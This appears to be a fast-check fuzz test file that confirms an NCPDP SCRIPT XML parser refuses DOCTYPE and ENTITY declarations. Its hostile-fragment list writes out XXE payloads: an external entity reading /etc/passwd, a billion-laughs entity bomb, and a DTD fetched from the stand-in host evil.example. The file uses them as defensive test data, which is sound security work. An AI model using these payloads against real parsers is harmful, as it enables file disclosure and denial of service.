/**
 * SCRIPT XML fuzz target: the XXE / entity-expansion boundary (NCPDP-10).
 *
 * `src/script/xml-load.ts` is the security boundary for the XML side: it refuses
 * any `<!DOCTYPE>` / `<!ENTITY>` declaration outright (before the input reaches
 * the reader), and the reader resolves no entity and refuses any `<!D`
 * declaration itself, so no external-entity (XXE) or billion-laughs vector exists. This target hammers
 * that boundary with adversarial XML and asserts two invariants:
 *
 *   1. **Never-throw contract**: `parseScript` on ANY input either returns a
 *      `ScriptMessage` (lenient, with warnings) or throws an
 *      `NcpdpScriptParseError` whose code is one of the sanctioned SCRIPT
 *      fatals. It never throws an unsanctioned error and never hangs (a
 *      billion-laughs payload is rejected at the declaration gate, so it is
 *      never expanded).
 *   2. **Entity-declaration refusal holds**: any input carrying a DOCTYPE or
 *      ENTITY declaration is REFUSED with `NCPDP_SCRIPT_NOT_XML`. The defense is
 *      never leniently parsed past.
 *
 * fast-check prints the counterexample + seed on failure. The nightly fuzz run
 * (`pnpm fuzz`, through the shared `nightly-fuzz.yml`) runs each target for a
 * time budget from a seed that changes every night, through the
 * `NCPDP_FUZZ_*` variables read by `test/_helpers/fuzz-config.ts`.
 */

import { describe, expect, it } from "vitest";
import fc from "fast-check";

import { parseScript, NcpdpScriptParseError, SCRIPT_FATAL_CODES } from "../../src/index.js";

import { checkFuzzTarget, fuzzTimeout, withinBudget } from "../_helpers/fuzz-config.js";

const SCRIPT_FATAL_CODE_SET = new Set<string>(Object.values(SCRIPT_FATAL_CODES));
const ENTITY_DECL_RE = /<!(?:DOCTYPE|ENTITY)\b/i;

/**
 * Adversarial XML fragments an attacker (or a malformed sender) might submit:
 * classic XXE external/internal entity DTDs, a billion-laughs nested-entity
 * bomb, a SYSTEM-file exfil DTD, plus benign-but-hostile structural noise
 * (deeply nested tags, huge attributes, CDATA, comments, PIs, unclosed tags).
 */
const HOSTILE_FRAGMENTS = [
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Message>&xxe;</Message>',
  '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">]><Message>&lol2;</Message>',
  '<!ENTITY x "expand">',
  '<!DOCTYPE Message SYSTEM "http://evil.example/x.dtd">',
  "<Message>&undefinedEntity;</Message>",
  "<Message><![CDATA[<!ENTITY not-a-real-decl>]]></Message>",
  "<!-- <!ENTITY commented> --><Message/>",
  "<?xml version='1.0'?><Message><Body><NewRx/></Body></Message>",
  "<Message" + "><a".repeat(50) + "/>".repeat(0) + "</Message>",
  '<Message a="' + "A".repeat(500) + '"/>',
  "<Message><Unclosed>",
  "not xml at all",
  "",
  "   ",
] as const;

/** Build a hostile XML string by combining/repeating/wrapping the fragments. */
function hostileXml(): fc.Arbitrary<string> {
  return fc
    .array(fc.constantFrom(...HOSTILE_FRAGMENTS), { minLength: 1, maxLength: 4 })
    .chain((parts) =>
      fc.record({
        parts: fc.constant(parts),
        wrap: fc.boolean(),
        junk: fc.string({ maxLength: 60 }),
      }),
    )
    .map(({ parts, wrap, junk }) => {
      const body = parts.join(junk);
      return wrap ? `<Message>${body}</Message>` : body;
    });
}

describe("SCRIPT XML XXE / entity fuzz", () => {
  it(
    "never throws outside the sanctioned SCRIPT fatals on adversarial XML",
    { timeout: fuzzTimeout(10_000, 300) },
    () => {
      checkFuzzTarget(
        "never throws outside the sanctioned SCRIPT fatals on adversarial XML",
        fc.property(hostileXml(), (raw) => {
          withinBudget(raw, () => {
            try {
              parseScript(raw);
            } catch (err) {
              expect(err).toBeInstanceOf(NcpdpScriptParseError);
              if (err instanceof NcpdpScriptParseError) {
                expect(SCRIPT_FATAL_CODE_SET.has(err.code)).toBe(true);
              }
            }
          });
        }),
        300,
      );
    },
  );

  it(
    "refuses every DOCTYPE/ENTITY declaration with NCPDP_SCRIPT_NOT_XML (XXE boundary holds)",
    { timeout: fuzzTimeout(10_000, 300) },
    () => {
      checkFuzzTarget(
        "refuses every DOCTYPE/ENTITY declaration with NCPDP_SCRIPT_NOT_XML (XXE boundary holds)",
        fc.property(hostileXml(), (raw) => {
          if (!ENTITY_DECL_RE.test(raw)) return; // only the entity-bearing inputs assert the boundary
          expect(() => parseScript(raw)).toThrow(NcpdpScriptParseError);
          try {
            parseScript(raw);
          } catch (err) {
            if (err instanceof NcpdpScriptParseError) {
              expect(err.code).toBe(SCRIPT_FATAL_CODES.NOT_XML);
            }
          }
        }),
        300,
      );
    },
  );
});
